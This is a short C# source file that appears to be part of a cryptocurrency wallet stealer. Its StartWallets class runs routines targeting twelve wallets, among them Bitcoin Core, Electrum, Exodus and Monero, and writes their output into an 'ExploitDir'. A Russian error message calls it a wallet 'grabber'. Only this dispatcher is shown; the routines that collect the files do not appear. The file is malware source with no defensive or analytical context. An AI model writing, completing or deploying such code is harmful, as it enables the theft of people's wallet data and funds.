using System;

namespace exos;

internal class StartWallets
{
	public static void Start()
	{
		string exploitDir = Helper.ExploitDir;
		try
		{
			Armory.ArmoryStr(exploitDir);
			AtomicWallet.AtomicStr(exploitDir);
			BitcoinCore.BCStr(exploitDir);
			Bytecoin.BCNcoinStr(exploitDir);
			DashCore.DSHcoinStr(exploitDir);
			Electrum.EleStr(exploitDir);
			Ethereum.EcoinStr(exploitDir);
			LitecoinCore.LitecStr(exploitDir);
			Monero.XMRcoinStr(exploitDir);
			Exodus.ExodusStr(exploitDir);
			Zcash.ZecwalletStr(exploitDir);
			Jaxx.JaxxStr(exploitDir);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "Старт грабера с кошелями дал сбой");
		}
	}
}
